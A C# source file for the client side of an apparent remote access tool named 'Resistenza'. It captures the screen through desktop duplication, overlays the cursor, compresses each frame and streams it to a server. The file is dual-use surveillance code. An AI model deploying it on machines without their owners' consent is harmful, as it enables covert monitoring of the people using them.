using NAudio.CoreAudioApi;
using NAudio.Wave;
using Resistenza.Client.Logic;
using Resistenza.Common.Networking;
using Resistenza.Common.Packets.Microphone;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Management;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

using SharpDX;
using SharpDX.Direct3D11;
using SharpDX.DXGI;
using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using NAudio.Utils;
using System.IO.Compression;


namespace Resistenza.Common.Packets.Remote_Desktop
{

    class DesktopDuplicator
    {
        // DLL nativo
        private const string DllName = "NativeDesktopDuplication.dll";

        [DllImport(DllName)]
        public static extern int InitializeDuplicator(int adapterIndex, int outputIndex);

        [DllImport(DllName)]
        public static extern int GetFrame(out IntPtr data, out int width, out int height, out int pitch);

        [DllImport(DllName)]
        public static extern void ReleaseFrame();

        [DllImport(DllName)]
        public static extern void Shutdown();

        // Cursor helper
        public static class CursorHelper
        {
            [StructLayout(LayoutKind.Sequential)]
            public struct POINT { public int X; public int Y; }

            [StructLayout(LayoutKind.Sequential)]
            public struct ICONINFO
            {
                public bool fIcon;
                public int xHotspot;
                public int yHotspot;
                public IntPtr hbmMask;
                public IntPtr hbmColor;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct CURSORINFO
            {
                public int cbSize;
                public int flags;
                public IntPtr hCursor;
                public POINT ptScreenPos;
            }

            [DllImport("user32.dll")]
            public static extern bool GetCursorInfo(out CURSORINFO pci);

            [DllImport("user32.dll")]
            public static extern bool GetIconInfo(IntPtr hIcon, out ICONINFO piconinfo);

            [DllImport("gdi32.dll")]
            public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

            [DllImport("gdi32.dll")]
            public static extern bool DeleteDC(IntPtr hdc);

            public const int CURSOR_SHOWING = 0x00000001;

            [DllImport("gdi32.dll")]
            private static extern bool GetBitmapBits(IntPtr hBitmap, int cbBuffer, byte[] lpvBits);

            [DllImport("gdi32.dll")]
            private static extern bool DeleteObject(IntPtr hObject);

            [StructLayout(LayoutKind.Sequential)]
            private struct BITMAP
            {
                public int bmType;
                public int bmWidth;
                public int bmHeight;
                public int bmWidthBytes;
                public ushort bmPlanes;
                public ushort bmBitsPixel;
                public IntPtr bmBits;
            }

            [DllImport("gdi32.dll")]
            private static extern int GetObject(IntPtr hObject, int nSize, out BITMAP lpObject);
            // Disegna il cursore direttamente sul buffer ARGB

            [DllImport("user32.dll", SetLastError = true)]
            static extern bool DrawIconEx(
    IntPtr hdc,
    int xLeft,
    int yTop,
    IntPtr hIcon,
    int cxWidth,
    int cyHeight,
    int istepIfAniCur,
    IntPtr hbrFlickerFreeDraw,
    int diFlags);

            private const int DI_NORMAL = 0x0003;

            unsafe
            public static void DrawCursor(IntPtr buffer, int width, int height, int pitch)
            {
                CURSORINFO ci = new CURSORINFO { cbSize = Marshal.SizeOf(typeof(CURSORINFO)) };
                if (!GetCursorInfo(out ci) || (ci.flags & CURSOR_SHOWING) == 0)
                    return;

                if (!GetIconInfo(ci.hCursor, out ICONINFO iconInfo))
                    return;

                try
                {
                    // creiamo un bitmap ARGB
                    using (var cursorBmp = new Bitmap(32, 32, PixelFormat.Format32bppArgb)) // dimensione massima cursore
                    {
                        using (Graphics g = Graphics.FromImage(cursorBmp))
                        {
                            IntPtr hdc = g.GetHdc();
                            DrawIconEx(hdc, 0, 0, ci.hCursor, 0, 0, 0, IntPtr.Zero, DI_NORMAL);
                            g.ReleaseHdc(hdc);
                        }

                        Rectangle rect = new Rectangle(0, 0, cursorBmp.Width, cursorBmp.Height);
                        BitmapData bmpData = cursorBmp.LockBits(rect, ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);

                        byte* srcPtr = (byte*)bmpData.Scan0;
                        int x = ci.ptScreenPos.X - iconInfo.xHotspot;
                        int y = ci.ptScreenPos.Y - iconInfo.yHotspot;

                        for (int row = 0; row < cursorBmp.Height; row++)
                        {
                            int py = y + row;
                            if (py < 0 || py >= height) continue;

                            for (int col = 0; col < cursorBmp.Width; col++)
                            {
                                int px = x + col;
                                if (px < 0 || px >= width) continue;

                                byte* dest = (byte*)buffer + py * pitch + px * 4;

                                byte b = srcPtr[col * 4 + 0];
                                byte g = srcPtr[col * 4 + 1];
                                byte r = srcPtr[col * 4 + 2];
                                byte a = srcPtr[col * 4 + 3];

                                if (a > 0)
                                {
                                    dest[0] = b;
                                    dest[1] = g;
                                    dest[2] = r;
                                    dest[3] = a;
                                }
                            }
                            srcPtr += bmpData.Stride;
                        }

                        cursorBmp.UnlockBits(bmpData);
                    }
                }
                finally
                {
                    if (iconInfo.hbmColor != IntPtr.Zero) DeleteObject(iconInfo.hbmColor);
                    if (iconInfo.hbmMask != IntPtr.Zero) DeleteObject(iconInfo.hbmMask);
                }
            }
        }
    }


    public class DesktopBroadcast
    {
        public DesktopBroadcast(SecureStream Server)
        {

            _ServerStream = Server;
        
        }

        private SecureStream _ServerStream;
  
        private int _Frames;

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern bool EnumDisplayDevices(string lpDevice, uint iDevNum, ref DISPLAY_DEVICE lpDisplayDevice, uint dwFlags);

        [Flags()]
        public enum DisplayDeviceStateFlags : int
        {
            /// <summary>The device is part of the desktop.</summary>
            AttachedToDesktop = 0x1,
            MultiDriver = 0x2,
            /// <summary>The device is part of the desktop.</summary>
            PrimaryDevice = 0x4,
            /// <summary>Represents a pseudo device used to mirror application drawing for remoting or other purposes.</summary>
            MirroringDriver = 0x8,
            /// <summary>The device is VGA compatible.</summary>
            VGACompatible = 0x10,
            /// <summary>The device is removable; it cannot be the primary display.</summary>
            Removable = 0x20,
            /// <summary>The device has more display modes than its output devices support.</summary>
            ModesPruned = 0x8000000,
            Remote = 0x4000000,
            Disconnect = 0x2000000
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        public struct DISPLAY_DEVICE
        {
            [MarshalAs(UnmanagedType.U4)]
            public int cb;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
            public string DeviceName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string DeviceString;
            [MarshalAs(UnmanagedType.U4)]
            public DisplayDeviceStateFlags StateFlags;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string DeviceID;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            public string DeviceKey;
        }


        public static List<MonitorDeviceInfo> GetDevicesInfo()
        {
            List<MonitorDeviceInfo> monitors = new();

            foreach (Screen screen in Screen.AllScreens)
            {
                MonitorDeviceInfo info = new();
                info.ScreenWidth = screen.Bounds.Width;
                info.ScreenHeight = screen.Bounds.Height;
                info.IsMainMonitor = screen.Primary;

                monitors.Add(info);
                
            }
               

            return monitors;
        }

        private static string GetStringFromUShortArray(ushort[] array)
        {
            if (array == null) return string.Empty;
            return new string(array.TakeWhile(c => c != 0).Select(c => (char)c).ToArray());
        }



        public async Task StartStreaming(int MonitorIndex, CancellationTokenSourceWithId CancelOperation)
        {



            IntPtr data;
            int width, height, pitch;
            int buffer_size;

            if (DesktopDuplicator.InitializeDuplicator(0, MonitorIndex) != 0)
            {
                Console.WriteLine("[ERROR] InitializeDuplicator failed");
                return;
            }

            try
            {


                while (true)
                {
                    // Controllo cancel
                    if (CancelOperation.IsCancellationRequested &&
                        (CancelOperation.IdOfTaskToBeCancelled == TasksIds.STREAM_DESKTOP_TASK_ID ||
                         CancelOperation.IdOfTaskToBeCancelled == TasksIds.ALL_ACTIONS))
                    {
                        DesktopDuplicator.Shutdown();
                        CancelOperation.Token.ThrowIfCancellationRequested();
                    }



                    // Ottieni frame
                    if (DesktopDuplicator.GetFrame(out data, out width, out height, out pitch) == 0)
                    {
                        // Disegna cursore sul buffer
                       DesktopDuplicator.CursorHelper.DrawCursor(data, width, height, pitch);
                       

                        // Copia il buffer in un array gestito
                        buffer_size = height * pitch;
                        byte[] rawBuffer = new byte[buffer_size];

                        Marshal.Copy(data, rawBuffer, 0, buffer_size);

                        DesktopDuplicator.ReleaseFrame();

                        byte[] compressedBuffer;
                        using (MemoryStream ms = new MemoryStream())
                        {
                            using (GZipStream gzip = new GZipStream(ms, CompressionLevel.Fastest))
                            {
                                gzip.Write(rawBuffer, 0, rawBuffer.Length);
                            }
                            compressedBuffer = ms.ToArray();
                        }

                        var response = new DesktopFrameResponse
                        {
                            ScreenCapture =compressedBuffer,
                            Width = width,
                            Height = height,
                            Pitch = pitch

                        };

                      
                        await _ServerStream.SendPacketAsync(response);
                        await Task.Delay(5);

                    }


                }
            }
            catch (OperationCanceledException)
            {
                Console.WriteLine("[INFO] Streaming cancelled");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] Exception during streaming: " + ex);
            }
            finally
            {
                DesktopDuplicator.Shutdown();
            }


        }


       



    }

    public class MonitorDeviceInfo
    {
        public int ScreenHeight { get; set; }
        public int ScreenWidth { get; set; }
        public bool IsMainMonitor { get; set; }

    }

}
